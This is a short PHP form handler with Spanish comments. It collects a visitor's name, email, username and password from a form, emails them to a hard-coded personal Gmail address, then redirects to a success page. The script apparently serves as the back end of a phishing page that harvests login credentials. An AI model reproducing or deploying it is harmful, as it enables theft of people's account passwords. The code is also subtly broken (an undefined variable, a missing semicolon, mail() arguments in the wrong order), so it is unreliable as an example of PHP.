<?php

/*conecto mi form7 name7 con el server a traves de los names */

$nombre = $_POST['nombre'];
$correo = $_POST['correo'];
$usuario = $_POST['usuario'];
$clave = $_POST['clave'];

/*como me va a llegar a mi el email*/ 

$mensaje .= "este mensaje fue enviado por" . $nombre . ",\r\n";
$mensaje .= "su email es:" . $email . "\r\n";
$mensaje .= "el usuario es:" .$usuario . "\r\n";
$mensaje .= "la clave es:" .$clave . "\r\n";
$mensaje .= "enviado el" . date('d/m/Y', time());

$para = 'celeste.cordobaa276@gmail.com'

/*funcion mail*/ 

mail($para, utf8_decode($mensaje), $header);

/*redicreccion al haber enviado el form*/ 

header('location:exito.html');


?>